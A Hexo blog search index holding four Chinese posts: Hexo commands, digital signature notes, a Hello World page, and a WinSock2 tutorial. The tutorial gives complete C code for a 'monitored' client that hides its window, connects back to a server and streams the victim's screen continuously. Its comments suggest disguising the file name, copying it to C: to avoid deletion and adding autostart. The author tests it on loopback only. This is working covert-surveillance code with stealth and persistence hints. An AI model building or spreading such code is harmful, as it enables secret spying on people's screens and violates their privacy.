<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>博客操作指南</title>
    <link href="/2023/01/24/%E5%8D%9A%E5%AE%A2%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/"/>
    <url>/2023/01/24/%E5%8D%9A%E5%AE%A2%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/</url>
    
    <content type="html"><![CDATA[<h3 id="更新博客操作指南"><a href="#更新博客操作指南" class="headerlink" title="更新博客操作指南"></a>更新博客操作指南</h3><p><img src="/img/fluid.png"></p><h5 id="在Blog文件路径下打开终端"><a href="#在Blog文件路径下打开终端" class="headerlink" title="在Blog文件路径下打开终端"></a>在Blog文件路径下打开终端</h5><p>常用的Hexo 命令</p><ul><li>npm install hexo -g #安装Hexo</li><li>npm update hexo -g #升级 </li><li>hexo init #初始化博客</li></ul><p>命令简写</p><ul><li><p>hexo n “我的博客” &#x3D;&#x3D; hexo new “我的博客” #新建文章</p></li><li><p>hexo g &#x3D;&#x3D; hexo generate #生成</p></li><li><p>hexo s &#x3D;&#x3D; hexo server #启动服务预览</p></li><li><p>hexo d &#x3D;&#x3D; hexo deploy #部署</p></li><li><p>hexo server #Hexo会监视文件变动并自动更新，无须重启服务器</p></li><li><p>hexo server -s #静态模式</p></li><li><p>hexo server -p 5000 #更改端口</p></li><li><p>hexo server -i 192.168.1.1 #自定义 IP</p></li><li><p>hexo clean #清除缓存，若是网页正常情况下可以忽略这条命令</p></li></ul><h6 id="更新方法"><a href="#更新方法" class="headerlink" title="更新方法"></a>更新方法</h6><p>将文档放到_posts文件下后</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo clean </span><br><span class="hljs-attribute">hexo g </span><br><span class="hljs-attribute">hexo d</span><br></code></pre></td></tr></table></figure><p>参考网址：<a href="https://zhuanlan.zhihu.com/p/26625249">https://zhuanlan.zhihu.com/p/26625249</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Hexo</tag>
      
      <tag>Fluid</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网络编程 WinSock2完成屏幕监控</title>
    <link href="/2022/07/12/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B-WinSock2%E5%AE%8C%E6%88%90%E5%B1%8F%E5%B9%95%E7%9B%91%E6%8E%A7/"/>
    <url>/2022/07/12/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B-WinSock2%E5%AE%8C%E6%88%90%E5%B1%8F%E5%B9%95%E7%9B%91%E6%8E%A7/</url>
    
    <content type="html"><![CDATA[<p>本文章通过WinSock2库完成服务器端对客户端的实时屏幕获取。</p><p>主要思路就是通过TCP网络连接，客户端实时抓取屏幕保存在本地并发送给服务器端。</p><span id="more"></span><h2 id="一、程序测试："><a href="#一、程序测试：" class="headerlink" title="一、程序测试："></a>一、程序测试：</h2><p>仅在本机回环地址127.0.0.1测试。</p><p><img src="https://i0.hdslb.com/bfs/album/c0c5cf1712c92fa840092d869d8fc5ecd999e123.png"></p><p>被监控端打开client.exe（看不到反应，因为隐藏了窗口，但程序已经运行）。</p><p>之后监控端打开service.exe程序。</p><img src="https://i0.hdslb.com/bfs/album/6d5c2e943307670d858af8cacecdab2ae5263dc2.png" style="zoom: 25%;" /><p>会出现一个窗口，窗口内就是被监控端的电脑屏幕（这里直接是我本机画面），按空格键停止监控，client还在后台运行，用任务管理器关闭。</p><img src="https://i0.hdslb.com/bfs/album/463b3302a856960345a95e5a74ad5d7923bfcb11.png" style="zoom:50%;" /><!--more--><h2 id="二、环境配置："><a href="#二、环境配置：" class="headerlink" title="二、环境配置："></a>二、环境配置：</h2><p>本代码在VS2019下编写</p><img src="https://i0.hdslb.com/bfs/album/fc626417bf0e93762874f5e287ac4d77f9b9f5c8.png" style="zoom:50%;" /><p>需要打开两个新项目client和service，分别是客户端和服务器端。</p><p>需要调整属性，项目→属性。</p><img src="https://i0.hdslb.com/bfs/album/e6d0a3c9dad5270fa9a6f321a8110fc8472c76d7.png" style="zoom:50%;" /><img src="https://i0.hdslb.com/bfs/album/920959aaa6500b048cfd58f4bfa524aa1c64e408.png" style="zoom:50%;" /><img src="https://i0.hdslb.com/bfs/album/6ce086f9020395198c6c0580d8fb7d825109eb5d.png" style="zoom:50%;" /><p>将这三个调为图上的配置。</p><img src="https://i0.hdslb.com/bfs/album/960aa4a8bf8f5e3c18f809f77583cbb956b68502.png" style="zoom: 67%;" /><p>此处是Debug x64。</p><h2 id="三、代码："><a href="#三、代码：" class="headerlink" title="三、代码："></a>三、代码：</h2><h3 id="被监控端-x2F-client端："><a href="#被监控端-x2F-client端：" class="headerlink" title="被监控端&#x2F;client端："></a>被监控端&#x2F;client端：</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#include&lt;stdio.h&gt;</span><br><span class="hljs-comment">#include&lt;WinSock2.h&gt;</span><br><span class="hljs-comment">#include&lt;easyx.h&gt;</span><br><span class="hljs-comment">#pragma comment(linker, &quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)</span><br><span class="hljs-comment">#pragma comment(lib,&quot;ws2_32.lib&quot;)</span><br><span class="hljs-regexp">//</span>被监控端<br>int main()<br>&#123;<br><span class="hljs-regexp">//</span>按需求可以继续优化以下内容<br><span class="hljs-regexp">//</span>将程序名设置为容易被人打开的<br><span class="hljs-regexp">//</span>防删除，拷贝一份，拷贝到C盘<br><span class="hljs-regexp">//</span>开机自启<br><br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br><span class="hljs-regexp">//</span>初始化网络资源<br>WSADATA wsaData;<br>WSAStartup(MAKEWORD(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), &amp;wsaData);<br><br><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span>搭建socket网络传输TCP<br>SOCKET hsock = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<span class="hljs-regexp">//</span>IPv4<br>SOCKADDR_IN servAdr;<br>servAdr.sin_family = AF_INET;<br>servAdr.sin_addr.s_addr = inet_addr(<span class="hljs-string">&quot;127.0.0.1&quot;</span>);<span class="hljs-regexp">//</span>本机回环地址<br>servAdr.sin_port = htons(<span class="hljs-number">7777</span>);<br><br><span class="hljs-keyword">while</span>(connect(hsock, (SOCKADDR*)&amp;servAdr, sizeof(servAdr))==SOCKET_ERROR);<br><br><span class="hljs-regexp">//</span>获取桌面图像的准备工作<br>int CX = GetSystemMetrics(SM_CXSCREEN);<span class="hljs-regexp">//</span>水平分辨率<br>int CY = GetSystemMetrics(SM_CYSCREEN);<span class="hljs-regexp">//</span>垂直分辨率<br><span class="hljs-regexp">//</span>CX = CX * <span class="hljs-number">1.25</span>; CY = CY * <span class="hljs-number">1.25</span>;<br>IMAGE image(CX, CY);<span class="hljs-regexp">//</span>定义一张图片，大小和桌面一样大<br>HDC dc, imageDC;<span class="hljs-regexp">//</span>设备上下文<br>char buf[<span class="hljs-number">1024</span>] = &#123; <span class="hljs-number">0</span> &#125;;<span class="hljs-regexp">//</span>发送数据的内存<br>FILE* fp;<span class="hljs-regexp">//</span>文件<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-regexp">//</span>获取一帧<br>dc = CreateDC(<span class="hljs-string">&quot;DISPLAY&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<span class="hljs-regexp">//</span>桌面图像<br>imageDC = GetImageHDC(&amp;image);<br><span class="hljs-regexp">//</span>桌面的图像---&gt;image的图像<br>BitBlt(imageDC, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, CX, CY, dc, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, SRCCOPY);<br>saveimage(<span class="hljs-string">&quot;C:\\Users\\Public\\Pictures\\screenshot.jpg&quot;</span>, &amp;image);<br><br><span class="hljs-regexp">//</span>发送一帧<br><span class="hljs-regexp">//</span>打开图片文件<br>fp = fopen(<span class="hljs-string">&quot;C:\\Users\\Public\\Pictures\\screenshot.jpg&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br><span class="hljs-regexp">//</span>计算图片大小<br>fseek(fp, <span class="hljs-number">0</span>, SEEK_END);<span class="hljs-regexp">//</span>光标移动到最后<br>int allbytes = ftell(fp);<span class="hljs-regexp">//</span>返回从文件头到当前光标字节大写<br>fseek(fp, <span class="hljs-number">0</span>, SEEK_SET);<br><span class="hljs-regexp">//</span>发文件大小<br>send(hsock, (const char*)&amp;allbytes, sizeof(allbytes),<span class="hljs-number">0</span>);<br><span class="hljs-regexp">//</span>文件发过去<br>int bytes;<br><span class="hljs-keyword">while</span> ((bytes = fread(buf, <span class="hljs-number">1</span>, <span class="hljs-number">1024</span>, fp)) &gt; <span class="hljs-number">0</span>)<br>send(hsock, buf, bytes, <span class="hljs-number">0</span>);<br>fclose(fp);<br><br><span class="hljs-regexp">//</span>接收-<span class="hljs-number">1</span>不发<br><br><span class="hljs-regexp">//</span>接收<span class="hljs-number">1</span> 继续发<br>int n = <span class="hljs-number">0</span>;<br>recv(hsock, (char*)&amp;n, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (n != <span class="hljs-number">1</span>)<br><span class="hljs-keyword">break</span>;<br>&#125;<br>closesocket(hsock);<br><br><span class="hljs-regexp">//</span>清理网络资源<br>WSACleanup();<br>&#125;<br>return <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="监控端-x2F-service端："><a href="#监控端-x2F-service端：" class="headerlink" title="监控端&#x2F;service端："></a>监控端&#x2F;service端：</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;WinSock2.h&gt;</span><span class="hljs-comment">//网络头文件</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;easyx.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib,<span class="hljs-string">&quot;ws2_32.lib&quot;</span>)<span class="hljs-comment">//网络库文件</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//初始化网络资源</span><br>WSADATA wsaData;<br><span class="hljs-built_in">WSAStartup</span>(<span class="hljs-built_in">MAKEWORD</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), &amp;wsaData);<br><br><span class="hljs-comment">//搭建socket网络传输TCP</span><br>SOCKET hServSock = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<span class="hljs-comment">//IPv4</span><br>SOCKADDR_IN servAdr;<br>servAdr.sin_family = AF_INET;<br>servAdr.sin_addr.s_addr = <span class="hljs-built_in">htonl</span>(INADDR_ANY);<span class="hljs-comment">//使用服务器地址</span><br>servAdr.sin_port = <span class="hljs-built_in">htons</span>(<span class="hljs-number">7777</span>);<br><span class="hljs-built_in">bind</span>(hServSock, (SOCKADDR*)&amp;servAdr, <span class="hljs-built_in">sizeof</span>(servAdr));<br><span class="hljs-built_in">listen</span>(hServSock, <span class="hljs-number">5</span>);<span class="hljs-comment">//监听</span><br><br>SOCKADDR_IN clntAdr;<br><span class="hljs-type">int</span> clntAdrSz = <span class="hljs-built_in">sizeof</span>(clntAdr);<br>SOCKET hsock = <span class="hljs-built_in">accept</span>(hServSock, (SOCKADDR*)&amp;clntAdr, &amp;clntAdrSz);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;已经连接！&quot;</span>);<br><br><span class="hljs-comment">//创建一个窗口</span><br><span class="hljs-built_in">initgraph</span>(<span class="hljs-number">1280</span>, <span class="hljs-number">720</span>, EW_NOCLOSE);<br>FILE* fp;<br><span class="hljs-type">char</span> buf[<span class="hljs-number">1024</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-comment">//接收文件的数据大小</span><br><span class="hljs-type">int</span> allbytes = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">recv</span>(hsock, (<span class="hljs-type">char</span>*)&amp;allbytes, <span class="hljs-built_in">sizeof</span>(allbytes), <span class="hljs-number">0</span>);<br><br><span class="hljs-comment">//创建文件 接收</span><br>fp = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;1.jpg&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>);<br><span class="hljs-type">int</span> bytes, sum = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> ((bytes = <span class="hljs-built_in">recv</span>(hsock, buf, <span class="hljs-number">1024</span>, <span class="hljs-number">0</span>)) &gt; <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-built_in">fwrite</span>(buf, <span class="hljs-number">1</span>, bytes, fp);<br>sum += bytes;<br><span class="hljs-keyword">if</span> (sum &gt;= allbytes)<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-built_in">fclose</span>(fp);<br><br><span class="hljs-built_in">loadimage</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;1.jpg&quot;</span>, <span class="hljs-number">1280</span>, <span class="hljs-number">720</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">GetAsyncKeyState</span>(VK_SPACE))<br>&#123;<br><span class="hljs-type">int</span> n = <span class="hljs-number">-1</span>;<span class="hljs-comment">//退出了</span><br><span class="hljs-built_in">send</span>(hsock, (<span class="hljs-type">const</span> <span class="hljs-type">char</span>*)&amp;n, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">closegraph</span>();<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-type">int</span> n = <span class="hljs-number">1</span>;<br><span class="hljs-built_in">send</span>(hsock, (<span class="hljs-type">const</span> <span class="hljs-type">char</span>*)&amp;n, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>);<br>&#125;<br>&#125;<br><span class="hljs-comment">//清理网络资源</span><br><span class="hljs-built_in">WSACleanup</span>();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="四、可能遇到的问题："><a href="#四、可能遇到的问题：" class="headerlink" title="四、可能遇到的问题："></a>四、可能遇到的问题：</h2><ol><li><p>1.&lt;easyx.h&gt;头文件没有，可以在网上下载这个库。</p></li><li><p>2.代码标红出错，配置没有调对。</p></li><li><p>3.屏幕尺寸不对，可以通过修改代码调试，如果抓取的屏幕不完整，可能是被抓取的屏幕没有按照100％显示。</p></li><li><p>4.有关路径按自身电脑配置。</p></li><li><p>5.最后生成解决方案后可以到Debug问下下找到.exe文件。</p></li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>数字签名</title>
    <link href="/2022/06/24/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/"/>
    <url>/2022/06/24/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/</url>
    
    <content type="html"><![CDATA[<h1 id="Digital-Signature"><a href="#Digital-Signature" class="headerlink" title="Digital Signature"></a>Digital Signature</h1><ol><li>数字签名概述</li><li>RSA数字签名算法</li><li>DSA数字签名算法</li><li>ECDSA数字签名算法 <span id="more"></span></li></ol><h2 id="一、数字签名概述"><a href="#一、数字签名概述" class="headerlink" title="一、数字签名概述"></a>一、数字签名概述</h2><h3 id="1、手书签名的作用和目的"><a href="#1、手书签名的作用和目的" class="headerlink" title="1、手书签名的作用和目的"></a>1、手书签名的作用和目的</h3><p>（1）表示签名者对消息的认可；</p><p>（2）他人可识别和验证出是谁的签名；</p><p>（3）他人无法伪造和更改签名，即</p><p>​（A）无法凭空造出一个签名；</p><p>​（B)对一个文件的签名不能复制或篡改称对另一个文件的签名；</p><p>（4）可仲裁性：出现争议时第三方可仲裁；</p><p>  仲裁内容：</p><p>​（1）签名者是否在抵赖，否认签名；</p><p>​（2）验证者是否在欺诈，伪造签名；</p><p>签名的实现方式：</p><p>​就是在原文件上追加一定的笔记信息，并使二者形成一个整体。</p><h3 id="2-数字签名应满足的条件"><a href="#2-数字签名应满足的条件" class="headerlink" title="2.数字签名应满足的条件"></a>2.数字签名应满足的条件</h3><p>（1）签名与文件是一个不可分割的整体；</p><p>实现：对消息进行某种变换完成签名；使签名是待签名的文件的函数。</p><p>（2）签名者事后不能否认自己的签名；</p><p>实现：签名是通过发方所独有的秘密信息来完成，并且该秘密信息对应惟一公开的验证信息，使签名者不能抵赖自己的签名。</p><p>（3）接受者能验证签名，而任何人都不可以伪造签名：</p><p>实现：签名必须与特定的公开信息相对应，使接收方能够验证；签名应与签名者独有的秘密信息密切相关，使其他人不能伪造。</p><p>（4）当双方关于签名的真伪发生争执时，一个法官或第三方能解决双方之间发生的争执。</p><p>实现：签名对应的验证密钥应由可信的第三方确认并公布。当发生争执时，靠法律解决争端。</p><h3 id="3-数字签名方案的分类"><a href="#3-数字签名方案的分类" class="headerlink" title="3.数字签名方案的分类"></a>3.数字签名方案的分类</h3><p>（1）利用特殊的公钥加密算法实现。</p><p>并非所有的公钥加密算法都能实现数字签名，只有满足<br>$$<br>D_{k_{d}}\left(E_{k_{e}}(x)\right)&#x3D;E_{k_{e}}\left(D_{k_{d}}(x)\right)&#x3D;x<br>$$<br>的公钥密码算法，才能实现数字签名。其中D是脱密算法，E是加密算法。</p><p>（2）利用专门设计的数字签名算法实现。</p><h3 id="基于公钥算法设计的数字签名"><a href="#基于公钥算法设计的数字签名" class="headerlink" title="基于公钥算法设计的数字签名"></a><center>基于公钥算法设计的数字签名</center></h3><p>未完待续……</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/06/22/hello-world/"/>
    <url>/2022/06/22/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2> <span id="more"></span><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
